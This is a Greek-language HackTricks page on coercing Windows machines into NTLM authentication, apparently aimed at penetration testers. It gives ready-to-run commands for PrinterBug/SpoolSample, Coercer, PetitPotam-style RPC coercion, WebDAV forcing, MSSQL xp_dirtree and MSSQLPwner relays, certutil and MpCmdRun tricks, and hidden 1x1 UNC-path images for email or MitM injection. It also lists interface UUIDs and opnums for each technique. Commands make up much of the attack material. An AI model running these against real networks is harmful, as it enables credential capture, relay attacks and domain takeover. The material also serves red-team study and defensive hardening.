# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

Το [**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) είναι μια **collection** από **remote authentication triggers**, γραμμένη σε C# με χρήση του MIDL compiler, ώστε να αποφεύγονται dependencies τρίτων.

## Spooler Service Abuse

Αν η υπηρεσία _**Print Spooler**_ είναι **enabled,** μπορείτε να χρησιμοποιήσετε ήδη γνωστά AD credentials για να **request** από τον print server του Domain Controller μια **ενημέρωση** σχετικά με νέα print jobs και απλώς να του υποδείξετε να **στείλει την ειδοποίηση σε κάποιο system**.\
Σημειώστε ότι όταν ο printer στέλνει την ειδοποίηση σε arbitrary systems, χρειάζεται να **κάνει authenticate against** αυτό το **system**. Επομένως, ένας attacker μπορεί να κάνει την υπηρεσία _**Print Spooler**_ να κάνει authenticate against ένα arbitrary system, και η υπηρεσία θα **χρησιμοποιήσει το computer account** σε αυτό το authentication.

Under the hood, το κλασικό **PrinterBug** primitive κάνει abuse το **`RpcRemoteFindFirstPrinterChangeNotificationEx`** μέσω του **`\\PIPE\\spoolss`**. Ο attacker αρχικά ανοίγει ένα printer/server handle και στη συνέχεια παρέχει ένα fake client name στο `pszLocalMachine`, ώστε ο target spooler να δημιουργήσει ένα notification channel **πίσω προς το host που ελέγχει ο attacker**. Αυτός είναι ο λόγος για τον οποίο το αποτέλεσμα είναι **outbound authentication coercion** και όχι άμεση εκτέλεση κώδικα.<sup>[[2]](#references)</sup>\
Αν αναζητάτε **RCE/LPE** στον ίδιο τον spooler, ελέγξτε το [PrintNightmare](printnightmare.md). Αυτή η σελίδα εστιάζει σε **coercion και relay**.

### Εύρεση Windows Servers στο domain

Χρησιμοποιήστε PowerShell για να εμφανίσετε τα Windows hosts. Οι servers είναι συνήθως οι στόχοι υψηλότερης προτεραιότητας, επομένως εστιάστε πρώτα σε αυτούς:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Εντοπισμός υπηρεσιών Spooler που ακούν

Χρησιμοποιώντας το ελαφρώς τροποποιημένο [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) του @mysmartlogin (Vincent Le Toux), ελέγξτε αν η υπηρεσία Spooler ακούει:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Μπορείτε επίσης να χρησιμοποιήσετε το `rpcdump.py` στο Linux και να αναζητήσετε το πρωτόκολλο **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Ή ελέγξτε γρήγορα hosts από Linux με **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Αν θέλετε να **απαριθμήσετε τις επιφάνειες coercion** αντί να ελέγξετε απλώς αν υπάρχει το endpoint του spooler, χρησιμοποιήστε το **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Αυτό είναι χρήσιμο, επειδή το να βλέπετε το endpoint στο EPM απλώς σας δείχνει ότι το print RPC interface είναι καταχωρημένο. Δεν εγγυάται **ότι κάθε coercion method είναι προσβάσιμη με τα τρέχοντα privileges σας ή ότι ο host θα δημιουργήσει ένα usable authentication flow**.

### Ζητήστε από την υπηρεσία να πραγματοποιήσει authentication σε έναν αυθαίρετο host

Μπορείτε να κάνετε compile το [SpoolSample από εδώ](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ή χρησιμοποιήστε το [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ή το [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) αν βρίσκεστε σε Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Με το **Coercer**, μπορείτε να στοχεύσετε απευθείας τα interfaces του spooler και να αποφύγετε την εικασία σχετικά με το ποια μέθοδος RPC εκτίθεται:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Εξαναγκασμός HTTP αντί για SMB με WebClient

Το κλασικό PrinterBug συνήθως προκαλεί authentication μέσω **SMB** προς `\\attacker\share`, το οποίο εξακολουθεί να είναι χρήσιμο για **capture**, **relay σε HTTP targets** ή **relay όταν απουσιάζει το SMB signing**.\
Ωστόσο, σε σύγχρονα περιβάλλοντα, το **relay από SMB σε SMB** συχνά αποκλείεται από το **SMB signing**, επομένως οι operators συνήθως προτιμούν να εξαναγκάζουν authentication μέσω **HTTP/WebDAV**.

Εάν το target έχει ενεργοποιημένη την υπηρεσία **WebClient**, ο listener μπορεί να καθοριστεί με τρόπο που κάνει τα Windows να χρησιμοποιούν **WebDAV μέσω HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν γίνεται chaining με το **`ntlmrelayx --adcs`** ή άλλους HTTP relay targets, επειδή δεν βασίζεται στη δυνατότητα SMB relay της coerced σύνδεσης. Η σημαντική προϋπόθεση είναι ότι το **WebClient πρέπει να εκτελείται** στο victim για να λειτουργήσει η παραλλαγή HTTP/WebDAV.

### Συνδυασμός με Unconstrained Delegation

Αν ένας attacker έχει compromised έναν computer που έχει ρυθμιστεί για [Unconstrained Delegation](unconstrained-delegation.md), μπορεί να **coerce τον printer να κάνει authentication σε αυτόν τον computer**. Το **TGT** του printer computer account αποθηκεύεται στη συνέχεια στη μνήμη του unconstrained-delegation host, όπου ο attacker μπορεί να το ανακτήσει και να το επαναχρησιμοποιήσει με [Pass the Ticket](pass-the-ticket.md).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (interfaces/opnums που ενεργοποιούν outbound authentication)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Σημειώσεις: asynchronous print interface στο ίδιο spooler pipe· χρησιμοποιήστε το Coercer για να απαριθμήσετε τις reachable methods σε έναν δεδομένο host<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (επίσης μέσω των \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums που γίνονται συχνά abuse: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Σημείωση: Αυτές οι methods δέχονται parameters που μπορούν να περιέχουν ένα UNC path (π.χ. `\\attacker\share`). Κατά την επεξεργασία τους, τα Windows κάνουν authentication (σε machine/user context) σε αυτό το UNC, επιτρέποντας NetNTLM capture ή relay.\
Για spooler abuse, το **MS-RPRN opnum 65** παραμένει το πιο συνηθισμένο και καλύτερα τεκμηριωμένο primitive, επειδή η προδιαγραφή του protocol αναφέρει ρητά ότι ο server δημιουργεί ένα notification channel πίσω προς τον client που καθορίζεται από το `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN μέσω \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: ο target επιχειρεί να ανοίξει το παρεχόμενο backup log path και κάνει authentication στο attacker-controlled UNC.<sup>[[1]](#references)</sup>
- Practical use: coercion Tier 0 assets (DC/RODC/Citrix/etc.) ώστε να εκπέμψουν NetNTLM και στη συνέχεια relay σε AD CS endpoints (ESC8/ESC11 scenarios) ή άλλες privileged services.<sup>[[1]](#references)</sup>

## PrivExchange

Η επίθεση `PrivExchange` είναι αποτέλεσμα ενός flaw που εντοπίστηκε στο **Exchange Server `PushSubscription` feature**. Αυτό το feature επιτρέπει στον Exchange server να εξαναγκαστεί, από οποιονδήποτε domain user με mailbox, να κάνει authentication σε οποιονδήποτε client-provided host μέσω HTTP.

Από προεπιλογή, το **Exchange service εκτελείται ως SYSTEM** και διαθέτει υπερβολικά privileges (συγκεκριμένα, διαθέτει **WriteDacl privileges στο domain πριν από το 2019 Cumulative Update**). Αυτό το flaw μπορεί να γίνει exploit για να ενεργοποιηθεί το **relaying information προς το LDAP και στη συνέχεια να γίνει extract η domain NTDS database**. Σε περιπτώσεις όπου το relay προς το LDAP δεν είναι εφικτό, το flaw μπορεί και πάλι να χρησιμοποιηθεί για relay και authentication σε άλλους hosts εντός του domain. Η επιτυχής εκμετάλλευση αυτής της επίθεσης παρέχει άμεση πρόσβαση στον Domain Admin με οποιονδήποτε authenticated domain user account.

## Inside Windows

Αν βρίσκεστε ήδη μέσα στο Windows machine, μπορείτε να εξαναγκάσετε τα Windows να συνδεθούν σε έναν server χρησιμοποιώντας privileged accounts με:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ή χρησιμοποιήστε αυτήν την άλλη technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Είναι δυνατό να χρησιμοποιηθεί το certutil.exe lolbin (δυαδικό αρχείο υπογεγραμμένο από τη Microsoft) για να εξαναγκαστεί έλεγχος ταυτότητας NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Μέσω email

Αν γνωρίζετε τη **διεύθυνση email** του χρήστη που συνδέεται σε ένα μηχάνημα το οποίο θέλετε να παραβιάσετε, μπορείτε απλώς να του στείλετε ένα **email με μια εικόνα 1x1**, όπως η ακόλουθη:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Όταν το θύμα το ανοίξει, τα Windows προσπαθούν να πραγματοποιήσουν authentication.

### MitM

Αν μπορείτε να εκτελέσετε μια επίθεση MitM και να εισαγάγετε HTML σε μια σελίδα που προβάλλεται από το θύμα, δοκιμάστε να εισαγάγετε μια εικόνα όπως:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Άλλοι τρόποι για να εξαναγκάσετε και να κάνετε phishing σε NTLM authentication


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Αν μπορείτε να κάνετε capture [NTLMv1 challenges, διαβάστε εδώ πώς να τα κάνετε crack](../ntlm/index.html#ntlmv1-attack).\
_Θυμηθείτε ότι για να κάνετε crack το NTLMv1 πρέπει να ορίσετε το Responder challenge σε "1122334455667788"_

## References

- [1] [Unit 42 – Το Authentication Coercion συνεχίζει να εξελίσσεται](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Πρωτόκολλο EventLog Remoting](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – Μέθοδοι windows-coerced-authentication](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
{{#include ../../banners/hacktricks-training.md}}
